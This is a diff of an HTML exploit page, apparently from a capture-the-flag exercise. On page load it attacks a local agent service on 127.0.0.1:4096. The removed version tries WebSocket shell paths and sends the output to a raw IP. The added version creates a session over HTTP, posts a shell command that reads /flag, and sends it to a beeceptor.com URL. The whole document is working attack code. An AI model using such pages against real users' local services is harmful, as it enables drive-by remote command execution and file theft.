@@ -1,55 +1,44 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-    <title>OpenShell WS Exploit</title>
-</head>
 <body>
-    <h1>Exploiting via WebSocket...</h1>
-    <script>
-        // 替换为你的收集地址
-        const EXFIL = "https:/8.153.202.232:2222/?data=";
-        const TARGET = "127.0.0.1";
-        const PORT = 4096;
+<script>
+(async () => {
+  const base = 'http://127.0.0.1:4096';
+  const exfil = 'https://1233334.free.beeceptor.com';
 
-        // 常见 WebSocket 路径
-        const PATHS = ["/ws", "/shell", "/exec", "/tty", "/session/ws", "/api/ws"];
+  try {
+    let agent = 'build';
 
-        // 命令：修改权限并读取 flag
-        const CMD = "chmod 644 /flag && cat /flag";
+    try {
+      const ar = await fetch(base + '/agent');
+      const aj = await ar.json();
+      if (Array.isArray(aj) && aj.length) {
+        agent = aj.find(x => x.id === 'build')?.id || aj[0].id || 'build';
+      }
+    } catch (_) {}
 
-        async function tryPath(path) {
-            return new Promise((resolve) => {
-                const ws = new WebSocket(`ws://${TARGET}:${PORT}${path}`);
-                let timeout = setTimeout(() => {
-                    ws.close();
-                    resolve(false);
-                }, 2000);
+    const sr = await fetch(base + '/session', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: '{}'
+    });
+    const session = await sr.json();
 
-                ws.onopen = () => {
-                    clearTimeout(timeout);
-                    ws.send(CMD);
-                };
+    const cmd =
+      `chmod 644 /flag && ` +
+      `node -e "const https=require('https'),fs=require('fs');` +
+      `https.get('${exfil}?f='+encodeURIComponent(fs.readFileSync('/flag','utf8')))"`;
 
-                ws.onmessage = (e) => {
-                    if (e.data.includes("flag{")) {
-                        fetch(EXFIL + encodeURIComponent(e.data));
-                        ws.close();
-                        resolve(true);
-                    }
-                };
-
-                ws.onerror = () => {
-                    clearTimeout(timeout);
-                    resolve(false);
-                };
-            });
-        }
-
-        (async () => {
-            for (let p of PATHS) {
-                if (await tryPath(p)) break;
-            }
-        })();
-    </script>
+    await fetch(`${base}/session/${session.id}/shell`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        agent,
+        command: cmd
+      })
+    });
+  } catch (e) {}
+})();
+</script>
 </body>
 </html>
